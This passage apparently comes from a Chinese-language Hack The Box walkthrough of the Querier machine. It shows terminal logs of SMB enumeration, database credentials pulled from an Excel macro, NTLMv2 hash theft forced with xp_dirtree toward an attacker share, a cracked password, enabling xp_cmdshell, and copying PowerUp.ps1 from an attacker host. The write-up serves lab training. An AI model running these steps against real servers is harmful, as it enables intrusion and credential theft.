class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.125 -p1433,139,5985,445,135<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-30 20:37 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.125<br>Host is up (0.15s latency).<br><br>PORT     STATE SERVICE       VERSION<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp  open  microsoft-ds?<br>1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM<br>|_ms-sql-info: ERROR: Script execution failed (use -d to debug)<br>|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)<br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| Not valid before: 2022-08-30T12:20:16<br>|_Not valid after:  2052-08-30T12:20:16<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-08-30T12:37:35+00:00; 0s from scanner time.<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-08-30T12:37:29<br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 23.67 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.125 -p1433,139,5985,445,135<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ smbmap -H 10.10.10.125          <br>[+] IP: 10.10.10.125:445        Name: 10.10.10.125                                      <br>                                                                                                                                        <br>CrazyInSide:~/HackTheBox$ smbclient -N -L //10.10.10.125<br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>        Reports         Disk      <br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br>                                                                                                                                        <br>CrazyInSide:~/HackTheBox$ smbclient -N -L //10.10.10.125/Reports<br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>        Reports         Disk      <br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br>                                                                                                                                        <br>CrazyInSide:~/HackTheBox$ smbclient  //10.10.10.125/Reports <br>Password <span class="hljs-keyword">for</span> [WORKGROUP\crazyinside]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Tue Jan 29 07:23:48 2019<br>  ..                                  D        0  Tue Jan 29 07:23:48 2019<br>  Currency Volume Report.xlsm         A    12229  Mon Jan 28 06:21:34 2019<br><br>                6469119 blocks of size 4096. 1615039 blocks available<br>smb: \&gt; get Currency Volume Report.xlsm <br>NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Currency<br>smb: \&gt; get <span class="hljs-string">&quot;Currency Volume Report.xlsm&quot;</span><br>getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (22.6 KiloBytes/sec) (average 22.6 KiloBytes/sec)<br>smb: \&gt; <br></code></pre></td></tr></table></figure><p>文件打开是空的，但是它有宏代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ olevba Currency\ Volume\ Report.xlsm <br>olevba 0.60.1 on Python 3.10.5 - http://decalage.info/python/oletools<br>===============================================================================<br>FILE: Currency Volume Report.xlsm<br>Type: OpenXML<br>WARNING  For now, VBA stomping cannot be detected <span class="hljs-keyword">for</span> files <span class="hljs-keyword">in</span> memory<br>-------------------------------------------------------------------------------<br>VBA MACRO ThisWorkbook.cls <br><span class="hljs-keyword">in</span> file: xl/vbaProject.bin - OLE stream: <span class="hljs-string">&#x27;VBA/ThisWorkbook&#x27;</span><br>- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <br><br><span class="hljs-string">&#x27; macro to pull data for client volume reports</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27; further testing required</span><br><span class="hljs-string"></span><br><span class="hljs-string">Private Sub Connect()</span><br><span class="hljs-string"></span><br><span class="hljs-string">Dim conn As ADODB.Connection</span><br><span class="hljs-string">Dim rs As ADODB.Recordset</span><br><span class="hljs-string"></span><br><span class="hljs-string">Set conn = New ADODB.Connection</span><br><span class="hljs-string">conn.ConnectionString = &quot;Driver=&#123;SQL Server&#125;;Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;</span><br><span class="hljs-string">conn.ConnectionTimeout = 10</span><br><span class="hljs-string">conn.Open</span><br><span class="hljs-string"></span><br><span class="hljs-string">If conn.State = adStateOpen Then</span><br><span class="hljs-string"></span><br><span class="hljs-string">  &#x27;</span> MsgBox <span class="hljs-string">&quot;connection successful&quot;</span><br> <br>  <span class="hljs-string">&#x27;Set rs = conn.Execute(&quot;SELECT * @@version;&quot;)</span><br><span class="hljs-string">  Set rs = conn.Execute(&quot;SELECT * FROM volume;&quot;)</span><br><span class="hljs-string">  Sheets(1).Range(&quot;A1&quot;).CopyFromRecordset rs</span><br><span class="hljs-string">  rs.Close</span><br><span class="hljs-string"></span><br><span class="hljs-string">End If</span><br><span class="hljs-string"></span><br><span class="hljs-string">End Sub</span><br><span class="hljs-string">-------------------------------------------------------------------------------</span><br><span class="hljs-string">VBA MACRO Sheet1.cls </span><br><span class="hljs-string">in file: xl/vbaProject.bin - OLE stream: &#x27;</span>VBA/Sheet1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - </span><br><span class="hljs-string">(empty macro)</span><br><span class="hljs-string">+----------+--------------------+---------------------------------------------+</span><br><span class="hljs-string">|Type      |Keyword             |Description                                  |</span><br><span class="hljs-string">+----------+--------------------+---------------------------------------------+</span><br><span class="hljs-string">|Suspicious|Open                |May open a file                              |</span><br><span class="hljs-string">|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |</span><br><span class="hljs-string">|          |                    |used to obfuscate strings (option --decode to|</span><br><span class="hljs-string">|          |                    |see all)                                     |</span><br><span class="hljs-string">+----------+--------------------+---------------------------------------------+</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                                                                                                                        </span><br><span class="hljs-string">CrazyInSide:~/HackTheBox$ </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reporting:PcwTWTHRwryjc<span class="hljs-variable">$c6</span><br></code></pre></td></tr></table></figure><p>Impacket集合了很多常见的协议服务尤其windows平台的python脚本工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$  mssqlclient.py reporting:<span class="hljs-string">&#x27;PcwTWTHRwryjc$c6&#x27;</span>@10.10.10.125 -windows-auth<br>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation<br><br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192<br>[*] INFO(QUERIER): Line 1: Changed database context to <span class="hljs-string">&#x27;volume&#x27;</span>.<br>[*] INFO(QUERIER): Line 1: Changed language setting to us_english.<br>[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) <br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>SQL&gt; <span class="hljs-built_in">help</span><br><br>     lcd &#123;path&#125;                 - changes the current <span class="hljs-built_in">local</span> directory to &#123;path&#125;<br>     <span class="hljs-built_in">exit</span>                       - terminates the server process (and this session)<br>     enable_xp_cmdshell         - you know what it means<br>     disable_xp_cmdshell        - you know what it means<br>     xp_cmdshell &#123;cmd&#125;          - executes cmd using xp_cmdshell<br>     sp_start_job &#123;cmd&#125;         - executes cmd using the sql server agent (blind)<br>     ! &#123;cmd&#125;                    - executes a <span class="hljs-built_in">local</span> shell cmd<br>     <br>SQL&gt; <br></code></pre></td></tr></table></figure><p>只要有关目录的地方，windows基本都支持网络路径，涉及网络路径，就可能会引起hash泄露：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">SQL&gt; xp_dirtree <span class="hljs-string">&#x27;\\10.10.16.2\a&#x27;</span><br>subdirectory                                                                                                                                                                                                                                                            depth   <br><br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   <br><br>SQL&gt; <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] Listening <span class="hljs-keyword">for</span> events...<br><br>[SMB] NTLMv2-SSP Client   : 10.10.10.125<br>[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc<br>[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:d5c74d945297b5e0:0D7B58D2A3FBF559E168CA6285971D3A:010100000000000000C68D3AB2BCD801C8DE63E18FDBEFE50000000002000800490036003700490001001E00570049004E002D004F005600570038005A0034005700590049003600560004003400570049004E002D004F005600570038005A003400570059004900360056002E0049003600370049002E004C004F00430041004C000300140049003600370049002E004C004F00430041004C000500140049003600370049002E004C004F00430041004C000700080000C68D3AB2BCD80106000400020000000800300030000000000000000000000000300000CA5AA4559B6B1287813892DB7EC94C5FC1F702608003848806BE4E4A650CD7A60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003200000000000000000000000000<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSSQL-SVC::QUERIER:d5c74d945297b5e0:0d7b58d2a3fbf559e168ca6285971d3a:010100000000000000c68d3ab2bcd801c8de63e18fdbefe50000000002000800490036003700490001001e00570049004e002d004f005600570038005a0034005700590049003600560004003400570049004e002d004f005600570038005a003400570059004900360056002e0049003600370049002e004c004f00430041004c000300140049003600370049002e004c004f00430041004c000500140049003600370049002e004c004f00430041004c000700080000c68d3ab2bcd80106000400020000000800300030000000000000000000000000300000ca5aa4559b6b1287813892db7ec94c5fc1f702608003848806be4e4a650cd7a60a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003200000000000000000000000000:corporate568<br></code></pre></td></tr></table></figure><p>可以用新凭证链接mssql:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ mssqlclient.py mssql-svc:<span class="hljs-string">&#x27;corporate568&#x27;</span>@10.10.10.125 -windows-auth<br>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation<br><br>[*] Encryption required, switching to TLS<br>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master<br>[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english<br>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192<br>[*] INFO(QUERIER): Line 1: Changed database context to <span class="hljs-string">&#x27;master&#x27;</span>.<br>[*] INFO(QUERIER): Line 1: Changed language setting to us_english.<br>[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) <br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>SQL&gt; SELECT * FROM fn_my_permissions(NULL, <span class="hljs-string">&#x27;SERVER&#x27;</span>);<br>entity_name     subentity_name     permission_name<br>-------------   ----------------   --------------------------------<br>server                             CONNECT SQL                                                            <br>server                             SHUTDOWN                                                               <br>server                             CREATE ENDPOINT                                                        <br>server                             CREATE ANY DATABASE                                                    <br>server                             CREATE AVAILABILITY GROUP                                              <br>server                             ALTER ANY LOGIN                                                        <br>server                             ALTER ANY CREDENTIAL                                                   <br>server                             ALTER ANY ENDPOINT                                                     <br>server                             ALTER ANY LINKED SERVER                                                <br>server                             ALTER ANY CONNECTION                                                   <br>server                             ALTER ANY DATABASE                                                     <br>server                             ALTER RESOURCES                                                        <br>server                             ALTER SETTINGS                                                         <br>server                             ALTER TRACE                                                            <br>server                             ALTER ANY AVAILABILITY GROUP                                           <br>server                             ADMINISTER BULK OPERATIONS                                             <br>server                             AUTHENTICATE SERVER                                                    <br>server                             EXTERNAL ACCESS ASSEMBLY                                               <br>server                             VIEW ANY DATABASE                                                      <br>server                             VIEW ANY DEFINITION                                                    <br>server                             VIEW SERVER STATE                                                      <br>server                             CREATE DDL EVENT NOTIFICATION                                          <br>server                             CREATE TRACE EVENT NOTIFICATION                                        <br>server                             ALTER ANY EVENT NOTIFICATION                                           <br>server                             ALTER SERVER STATE                                                     <br>server                             UNSAFE ASSEMBLY                                                        <br>server                             ALTER ANY SERVER AUDIT                                                 <br>server                             CREATE SERVER ROLE                                                     <br>server                             ALTER ANY SERVER ROLE                                                  <br>server                             ALTER ANY EVENT SESSION                                                <br>server                             CONNECT ANY DATABASE                                                   <br>server                             IMPERSONATE ANY LOGIN                                                  <br>server                             SELECT ALL USER SECURABLES                                             <br>server                             CONTROL SERVER  <br>SQL&gt; xp_cmdshell <span class="hljs-built_in">whoami</span><br>[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure <span class="hljs-string">&#x27;sys.xp_cmdshell&#x27;</span> of component <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> because this component is turned off as part of the security configuration <span class="hljs-keyword">for</span> this server. A system administrator can <span class="hljs-built_in">enable</span> the use of <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> by using sp_configure. For more information about enabling <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, search <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> <span class="hljs-keyword">in</span> SQL Server Books Online.<br>SQL&gt; To allow advanced options to be changed<br>SQL&gt; EXEC sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, 1; <br>[*] INFO(QUERIER): Line 185: Configuration option <span class="hljs-string">&#x27;show advanced options&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.<br>SQL&gt; EXEC sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, 1; <br>[*] INFO(QUERIER): Line 185: Configuration option <span class="hljs-string">&#x27;show advanced options&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.<br>SQL&gt; RECONFIGURE; <br>SQL&gt; EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, 1;<br>[*] INFO(QUERIER): Line 185: Configuration option <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.<br>SQL&gt; RECONFIGURE;<br>SQL&gt; enable_xp_cmdshell<br>[*] INFO(QUERIER): Line 185: Configuration option <span class="hljs-string">&#x27;show advanced options&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.<br>[*] INFO(QUERIER): Line 185: Configuration option <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.<br>SQL&gt; xp_cmdshell <span class="hljs-built_in">whoami</span><br>output                  <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220830211121272.png" alt="image-20220830211121272"></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">mssql</span>-<span class="hljs-title">svc</span>\<span class="hljs-title">Desktop</span>&gt;<span class="hljs-title">dir</span></span><br><span class="hljs-function"><span class="hljs-title">dir</span></span><br><span class="hljs-function"> <span class="hljs-title">Volume</span> <span class="hljs-title">in</span> <span class="hljs-title">drive</span> <span class="hljs-title">C</span> <span class="hljs-title">has</span> <span class="hljs-title">no</span> <span class="hljs-title">label</span>.</span><br><span class="hljs-function"> <span class="hljs-title">Volume</span> <span class="hljs-title">Serial</span> <span class="hljs-title">Number</span> <span class="hljs-title">is</span> <span class="hljs-title">FE98</span>-<span class="hljs-title">F373</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Directory</span> <span class="hljs-title">of</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">mssql</span>-<span class="hljs-title">svc</span>\<span class="hljs-title">Desktop</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">01/29/2019  12:42 <span class="hljs-title">AM</span>    &lt;<span class="hljs-title">DIR</span>&gt;          .</span><br><span class="hljs-function">01/29/2019  12:42 <span class="hljs-title">AM</span>    &lt;<span class="hljs-title">DIR</span>&gt;          ..</span><br><span class="hljs-function">01/28/2019  01:08 <span class="hljs-title">AM</span>                33 <span class="hljs-title">user.txt</span></span><br><span class="hljs-function">               1 <span class="hljs-title">File</span>(<span class="hljs-title">s</span>)             33 <span class="hljs-title">bytes</span></span><br><span class="hljs-function">               2 <span class="hljs-title">Dir</span>(<span class="hljs-title">s</span>)   6,611,415,040 <span class="hljs-title">bytes</span> <span class="hljs-title">free</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">mssql</span>-<span class="hljs-title">svc</span>\<span class="hljs-title">Desktop</span>&gt;<span class="hljs-title">type</span> <span class="hljs-title">user.txt</span></span><br><span class="hljs-function"><span class="hljs-title">type</span> <span class="hljs-title">user.txt</span></span><br><span class="hljs-function"><span class="hljs-title">c37b41b</span>..........................</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">mssql</span>-<span class="hljs-title">svc</span>\<span class="hljs-title">Desktop</span>&gt;</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">mssql</span>-<span class="hljs-title">svc</span>\<span class="hljs-title">Desktop</span>&gt;<span class="hljs-title">copy</span> \\10.10.16.2\<span class="hljs-title">share</span>\<span class="hljs-title">PowerUp.ps1</span></span><br><span class="hljs-function"><span class="hljs-title">copy</span> \\10.10.16.2\<span class="hljs-title">share</span>\<span class="hljs-title">PowerUp.ps1</span></span><br><span class="hljs-function">        1 <span class="hljs-title">file</span>(<span class="hljs-title">s</span>) <span class="hljs-title">copied</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">mssql</span>-<span class="hljs-title">svc</span>\<span class="hljs-title">Desktop</span>&gt;<span class="hljs-title">dir</span></span><br><span class="hljs-function"><span class="hljs-title">dir</span></span><br><span class="hljs-function"> <span class="hljs-title">Volume</span> <span class="hljs-title">in</span> <span class="hljs-title">drive</span> <span class="hljs-title">C</span> <span class="hljs-title">has</span> <span class="hljs-title">no</span> <span class="hljs-title">label</span>.</span><br><span class="hljs-function"> <span class="hljs-title">Volume</span> <span class="hljs-title">Serial</span> <span class="hljs-title">Number</span> <span class="hljs-title">is</span> <span class="hljs-title">FE98</span>-<span class="hljs-title">F373</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">Directory</span> <span class="hljs-title">of</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">mssql</span>-<span class="hljs-title">svc</span>\<span class="hljs-title">Desktop</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">08/30/2022  02:14 <span class="hljs-title">PM</span>    &lt;<span class="hljs-title">DIR</span>&gt;          .</span><br><span class="hljs-function">08/30/2022  02:14 <span class="hljs-title">PM</span>    &lt;<span class="hljs-title">DIR</span>&gt;          ..</span><br><span class="hljs-function">08/30/2022  02:14 <span class="hljs-title">PM</span>                13 1.<span class="hljs-title">txt</span></span><br><span class="hljs-function">08/30/2022  02:14 <span class="hljs-title">PM</span>           600,580 <span class="hljs-title">PowerUp.ps1</span></span><br><span class="hljs-function">01/28/2019  01:08 <span class="hljs-title">AM</span>                33 <span class="hljs-title">user.txt</span></span><br><span class="hljs-function">               3 <span class="hljs-title">File</span>(<span class="hljs-title">s</span>)        600,626 <span class="hljs-title">bytes</span></span><br><span class="hljs-function">               2 <span class="hljs-title">Dir</span>(<span class="hljs-title">s</span>)   6,610,804,736 <span class="hljs-title">bytes</span> <span class="hljs-title">free</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">mssql</span>-<span class="hljs-title">svc</span>\<span class="hljs-title">Desktop</span>&gt;</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\mssql-svc\Desktop&gt;. .\PowerUp.ps1<br>. .\PowerUp.ps1<br><span class="hljs-string">&#x27;.&#x27;</span> is not recognized as an internal or external <span class="hljs-built_in">command</span>,<br>operable program or batch file.<br><br>C:\Users\mssql-svc\Desktop&gt;powershell<br>powershell<br>Windows PowerShell <br>Copyright (C) Microsoft Corporation. All rights reserved.<br><br>PS C:\Users\mssql-svc\Desktop&gt; <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\mssql-svc\Desktop<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----        8/30/2022   2:14 PM             13 1.txt                                                                 <br>-a----        8/30/2022   2:14 PM         600580 PowerUp.ps1                                                           <br>-a----        1/28/2019  12:08 AM             33 user.txt                                                              